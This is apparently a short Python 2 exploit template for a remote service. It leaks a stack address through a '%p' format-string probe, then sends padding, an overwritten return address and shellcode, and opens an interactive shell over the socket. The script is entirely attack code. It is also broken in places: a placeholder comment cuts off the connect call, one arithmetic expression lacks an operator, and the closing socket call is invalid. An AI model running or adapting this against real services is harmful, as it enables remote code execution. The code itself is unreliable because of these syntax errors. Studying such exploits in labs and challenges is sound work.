import struct
import socket

s = socket.socket()
s.connect(('IP', #Port))
r = s.recv(1024)
s.send("%p,%p,%p\n")
while ',' not in r:
    r = s.recv(1024)
start_buf = int(r.split(',')[1], 16)-9
print("leaked start of buffer: 0x{:08x}".format(start_buf))

raw_input("Do you want to exploit?")
padding = ""
RIP = struct.pack("Q", start_buf+len(padding)+8)
#shellcode = "\xcc"*64
shellcode = ""
RIP = struct.pack("Q", (start_buf+len(padding)+8) - 8 len(shellcode))
payload = padding[:-len(shellcode)] + RIP + shellcode
s.send(payload)

from telnetlib import Telnet
t = Telnet()
t.sock = s
t.interact()
s.socket.close
